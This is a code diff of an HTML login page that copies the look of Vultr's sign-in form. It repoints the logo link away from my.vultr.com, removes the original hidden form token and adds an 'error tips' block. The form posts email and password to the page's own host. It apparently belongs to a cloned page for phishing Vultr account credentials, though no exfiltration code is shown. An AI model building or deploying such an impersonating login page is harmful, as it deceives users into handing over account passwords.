@@ -12,25 +12,33 @@
 		<link href="./assets/css/form.authy.css" rel="stylesheet">
 		<link href="./assets/css/flags.authy.css" rel="stylesheet">
 
-	</head>
+</head>
 
-	<body style="position: relative; min-height: 100%; margin: 0px; padding: 0px; background-color: rgb(11, 65, 130);">
+<body style="position: relative; min-height: 100%; margin: 0px; padding: 0px; background-color: rgb(11, 65, 130);">
 
 		<div style="position: absolute; top: -120px; left: 0px; width: 100%; min-height: 100%; background: linear-gradient(0deg, #0b4182 1%, #1e88e5 100%);">
-				<div class="loggedout_vcenter">
-						<div style="padding: 8px;">
+			<div class="loggedout_vcenter">
+				<div style="padding: 8px;">
 				<div style="min-height:420px; max-width: 420px; padding:40px; background-color:#ffffff; margin-left: auto; margin-right: auto; border-radius:4px; overflow-x: hidden;">
-					<a href="https://my.vultr.com/" style="display:block; height:58px; width:167px; margin:0 auto 30px auto; background-image:url(./assets/images/logo.png); background-size: auto 50px; background-repeat:no-repeat;"></a>
-											<form method="post">
-		<input type="hidden" name="action" value="G+OfwwSoOyRvDwKHaVvc1ljwc7pGMFECfdr5BR0z8Xw=">
-		<input name="username" type="text" style="width:100%;" placeholder="Email Address" value="" required="required" autofocus="">
-		<hr class="hr15">
-		<input name="password" type="password" style="width:100%;" placeholder="Password" required="required">
-		<hr class="hr15">
-				<input type="submit" value="Login" style="width:100%;">
-		<hr class="hr20">
-		Help, I <a href="resetpassword.html">forgot my password</a>
-	</form>
+					<a href="/" style="display:block; height:58px; width:167px; margin:0 auto 30px auto; background-image:url(./assets/images/logo.png); background-size: auto 50px; background-repeat:no-repeat;"></a>
+
+					<form method="post">
+						<input name="username" type="text" style="width:100%;" placeholder="Email Address" value="" required="required" autofocus="">
+						<hr class="hr15">
+						<input name="password" type="password" style="width:100%;" placeholder="Password" required="required">
+
+						<!--错误提示-->
+						<div class="err-tips">
+							<br >
+							<img id="input_length_check" src="./assets/images/warning.png">
+							<span class="password_parameters_label"> error tips</span>
+						</div>
+
+						<hr class="hr15">
+						<input type="submit" value="Login" style="width:100%;">
+						<hr class="hr20">
+						Help, I <a href="resetpassword.html">forgot my password</a>
+					</form>
 				</div>
 			</div>
 		</div>
